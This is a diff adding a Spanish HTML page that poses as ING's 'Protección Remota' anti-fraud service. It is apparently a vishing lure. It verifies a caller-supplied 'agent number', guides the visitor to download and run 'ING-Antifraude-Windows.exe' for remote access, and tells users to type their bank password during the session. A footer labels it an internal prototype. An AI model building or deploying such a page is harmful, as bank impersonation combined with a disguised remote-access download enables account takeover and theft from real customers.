@@ -1,0 +1,193 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Asistencia antifraude remota de ING para proteger tu cuenta y cancelar operaciones fraudulentas.">
+  <title>ING Protección Remota</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicon-32-v2.png?v=2">
+  <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicon-16-v2.png?v=2">
+  <link rel="apple-touch-icon" href="assets/img/ing-favicon-v2.png?v=2">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/styles.css">
+  <script src="assets/js/app.js" defer></script>
+</head>
+<body>
+  <header class="header">
+    <div class="container header__inner">
+      <a class="brand" href="#inicio" aria-label="Inicio ING Protección Remota">
+        <img src="assets/img/ing-logo-full-dark.png" alt="ING">
+        <span></span>
+        <strong>Protección Remota</strong>
+      </a>
+      <nav class="nav" aria-label="Navegación principal">
+        <a href="#ayuda">Cómo te ayudamos</a>
+        <a href="#proceso">Qué ocurre</a>
+        <a href="#seguridad">Tu seguridad</a>
+      </nav>
+      <a class="button button--small" href="#empezar">Empezar ahora</a>
+      <button class="menu-button" id="menu-button" aria-label="Abrir menú" aria-expanded="false"><i></i><i></i></button>
+    </div>
+    <nav class="mobile-nav" id="mobile-nav" aria-label="Navegación móvil">
+      <a href="#ayuda">Cómo te ayudamos</a>
+      <a href="#proceso">Qué ocurre</a>
+      <a href="#seguridad">Tu seguridad</a>
+      <a class="button" href="#empezar">Empezar ahora</a>
+    </nav>
+  </header>
+
+  <main id="inicio">
+    <section class="hero">
+      <div class="hero__lion" aria-hidden="true"></div>
+      <div class="container hero__content">
+        <span class="status"><i></i> Servicio antifraude disponible</span>
+        <h1>Si algo no te cuadra,<br><em>estamos contigo.</em></h1>
+        <p class="hero__lead">Un especialista de ING puede revisar contigo lo que está pasando, comprobar conexiones sospechosas y cancelar las operaciones fraudulentas antes de que sea demasiado tarde.</p>
+        <div class="hero__actions">
+          <a class="button button--large" href="#empezar">Necesito ayuda ahora</a>
+          <a class="text-link" href="#proceso">Ver cómo funciona <span>→</span></a>
+        </div>
+        <div class="trust-row">
+          <span><b>✓</b> Sin coste</span>
+          <span><b>✓</b> Con tu permiso</span>
+          <span><b>✓</b> Tú puedes parar en cualquier momento</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="quick-help section" id="ayuda">
+      <div class="container">
+        <div class="section-heading reveal">
+          <span class="eyebrow">Cuéntanos qué ocurre</span>
+          <h2>¿En qué podemos ayudarte?</h2>
+          <p>Elige la situación que más se parece a la tuya. Te explicaremos el siguiente paso sin tecnicismos.</p>
+        </div>
+        <div class="help-layout reveal">
+          <div class="situations" role="tablist" aria-label="Situaciones de ayuda">
+            <button class="situation is-active" role="tab" aria-selected="true" data-case="charge">
+              <span class="situation__icon">€</span><span><strong>Veo un cargo que no reconozco</strong><small>Hay un pago o transferencia que yo no hice</small></span><i>›</i>
+            </button>
+            <button class="situation" role="tab" aria-selected="false" data-case="call">
+              <span class="situation__icon">☎</span><span><strong>Me han llamado diciendo que son ING</strong><small>Me piden claves, códigos o que instale algo</small></span><i>›</i>
+            </button>
+            <button class="situation" role="tab" aria-selected="false" data-case="device">
+              <span class="situation__icon">⌁</span><span><strong>Creo que alguien controla mi equipo</strong><small>El móvil u ordenador hace cosas extrañas</small></span><i>›</i>
+            </button>
+          </div>
+          <article class="answer-card" aria-live="polite">
+            <span class="answer-card__label">Qué haremos contigo</span>
+            <h3 id="case-title">Revisaremos y detendremos la operación</h3>
+            <p id="case-copy">Comprobaremos contigo las operaciones recientes. Si identificamos fraude, el sistema bloqueará o cancelará automáticamente las operaciones afectadas.</p>
+            <ul id="case-list">
+              <li>Revisión en tiempo real</li>
+              <li>Bloqueo de movimientos sospechosos</li>
+              <li>Confirmación clara al terminar</li>
+            </ul>
+            <a class="button" href="#empezar">Continuar</a>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="process section" id="proceso">
+      <div class="container">
+        <div class="section-heading section-heading--left reveal">
+          <span class="eyebrow">Paso a paso</span>
+          <h2>Te acompañamos de principio a fin</h2>
+          <p>No tienes que saber de informática. Nosotros te indicamos qué hacer en cada momento.</p>
+        </div>
+        <ol class="timeline">
+          <li class="reveal"><span>1</span><div><small>Primero</small><h3>Hablas con un especialista</h3><p>Nos cuentas qué ha pasado. Antes de iniciar nada, verificamos contigo que estás usando el canal correcto.</p></div></li>
+          <li class="reveal"><span>2</span><div><small>Después</small><h3>Autorizas la asistencia</h3><p>Inicias la herramienta de protección. La conexión solo comienza cuando tú das permiso y puedes cerrarla cuando quieras.</p></div></li>
+          <li class="reveal"><span>3</span><div><small>En tiempo real</small><h3>Revisamos el equipo y las operaciones</h3><p>Detectamos conexiones no autorizadas y comprobamos los movimientos pendientes que puedan ser fraudulentos.</p></div></li>
+          <li class="reveal"><span>4</span><div><small>Para terminar</small><h3>Cancelamos el fraude y protegemos tu cuenta</h3><p>Las operaciones fraudulentas se bloquean o cancelan automáticamente y te explicamos con claridad qué se ha hecho.</p></div></li>
+        </ol>
+      </div>
+    </section>
+
+    <section class="safety section" id="seguridad">
+      <div class="container safety__grid">
+        <div class="safety__copy reveal">
+          <span class="eyebrow">Antes de empezar</span>
+          <h2>Tu seguridad siempre va primero</h2>
+          <p>Queremos que te sientas acompañado y que mantengas el control durante toda la asistencia.</p>
+          <div class="warning"><strong>Recuerda:</strong> nunca te pediremos que nos digas tu contraseña, tu PIN ni un código recibido por SMS.</div>
+        </div>
+        <div class="safety__cards">
+          <article class="mini-card reveal"><span>01</span><h3>Tú decides</h3><p>Nadie entra en tu equipo sin que aceptes primero.</p></article>
+          <article class="mini-card reveal"><span>02</span><h3>Ves lo que ocurre</h3><p>Puedes seguir todos los pasos en la pantalla.</p></article>
+          <article class="mini-card reveal"><span>03</span><h3>Acceso temporal</h3><p>Al finalizar, la conexión queda cerrada.</p></article>
+          <article class="mini-card reveal"><span>04</span><h3>Confirmación final</h3><p>Te mostramos qué operaciones se han detenido.</p></article>
+        </div>
+      </div>
+    </section>
+
+    <section class="start section" id="empezar">
+      <div class="container">
+        <div class="start-card reveal">
+          <div>
+            <span class="eyebrow">Estamos preparados</span>
+            <h2>¿Empezamos?</h2>
+            <p>Descarga la herramienta cuando el especialista de ING te lo indique. Para tu seguridad, no la abras si no has solicitado asistencia.</p>
+          </div>
+          <div class="start-card__action">
+            <button class="button button--large" id="download-demo">Preparar asistencia</button>
+            <small>Disponible para Windows y macOS</small>
+          </div>
+        </div>
+        <div class="callout reveal"><span>!</span><p><strong>¿No has pedido ayuda?</strong> No descargues nada. Entra en la app de ING y utiliza únicamente los canales de contacto que aparecen allí.</p></div>
+      </div>
+    </section>
+
+    <section class="faq-section section">
+      <div class="container container--narrow">
+        <div class="section-heading reveal"><span class="eyebrow">Dudas frecuentes</span><h2>Queremos que todo quede claro</h2></div>
+        <div class="faq">
+          <details class="reveal"><summary>¿Puedo detener la asistencia cuando quiera?<span>+</span></summary><p>Sí. Tú mantienes el control y puedes cerrar la conexión en cualquier momento.</p></details>
+          <details class="reveal"><summary>¿Qué ocurre con una operación fraudulenta?<span>+</span></summary><p>Cuando el sistema confirma que una operación es fraudulenta, la bloquea o cancela automáticamente y te muestra el resultado.</p></details>
+          <details class="reveal"><summary>&iquest;C&oacute;mo accedo a la web de ING durante la asistencia?<span>+</span></summary><p>Cuando sea necesario, entrar&aacute;s en la web oficial de ING. Escribe tu clave en el campo de acceso y utiliza el icono del ojo para mantenerla oculta en pantalla.</p></details>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer__inner">
+      <div class="brand"><img src="assets/img/ing-logo-full-dark.png" alt="ING"><span></span><strong>Protección Remota</strong></div>
+      <p>Prototipo interno · Sujeto a validación legal, operativa y de seguridad</p>
+    </div>
+  </footer>
+
+  <div class="verification" id="verification" aria-hidden="true">
+    <div class="verification__backdrop" data-close-verification></div>
+    <section class="verification__dialog" role="dialog" aria-modal="true" aria-labelledby="verification-title">
+      <button class="verification__close" data-close-verification aria-label="Cerrar">&times;</button>
+      <div class="verification__icon" aria-hidden="true">&#9742;</div>
+      <span class="eyebrow">Comprobaci&oacute;n de seguridad</span>
+      <h2 id="verification-title">Hemos detectado que est&aacute;s en una llamada</h2>
+      <p>Antes de continuar, escribe el n&uacute;mero de agente que te ha indicado la persona con la que est&aacute;s hablando.</p>
+      <form id="agent-form">
+        <label for="agent-number">N&uacute;mero del agente ING</label>
+        <input id="agent-number" name="agent-number" inputmode="numeric" autocomplete="off" placeholder="Por ejemplo: 482731" maxlength="8" required>
+        <button class="button button--large" type="submit">Comprobar agente</button>
+      </form>
+      <div class="verification__result" id="verification-result" aria-live="assertive"></div>
+      <div class="install-guide" id="install-guide" aria-hidden="true">
+        <h3>Contin&uacute;a con estos pasos</h3>
+        <div class="download-switch" id="download-switch" aria-label="Cambiar descarga"><button class="is-active" data-download="windows" type="button">Windows</button><button data-download="macos" type="button">macOS</button></div>
+        <ol>
+          <li><span>1</span><div><strong>Descarga el programa de protecci&oacute;n</strong><p>Pulsa el bot&oacute;n de descarga que te mostrar&aacute; ING.</p></div></li>
+          <li><span>2</span><div><strong>Abre el archivo</strong><p>Cuando termine la descarga, haz doble clic para iniciar el programa.</p></div></li>
+          <li><span>3</span><div><strong>Autoriza la asistencia</strong><p>Revisa el nombre del agente ING y pulsa Aceptar cuando aparezca en la pantalla.</p></div></li>
+        </ol>
+        <a class="button button--large" id="protected-download" href="assets/downloads/ING-Antifraude-Windows.exe" download>Descargar para Windows</a>
+        <p class="install-guide__note">Mant&eacute;n esta ventana abierta: podr&aacute;s volver a consultar los pasos.</p>
+      </div>
+      <small>Introduce aqu&iacute; &uacute;nicamente el n&uacute;mero del agente.</small>
+    </section>
+  </div>
+</body>
+</html>
+
